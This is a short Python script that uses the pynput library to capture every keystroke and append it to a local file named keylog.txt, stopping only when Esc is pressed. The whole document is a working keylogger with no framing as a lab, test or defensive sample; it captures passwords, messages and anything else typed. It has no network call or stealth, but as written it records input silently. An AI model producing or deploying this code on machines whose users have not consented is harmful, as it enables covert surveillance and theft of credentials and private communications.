from pynput import keyboard

# Specify the file to save keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Convert key to string and write to file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    # Stop listener if 'esc' is pressed
    if key == keyboard.Key.esc:
        return False

# Setup the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()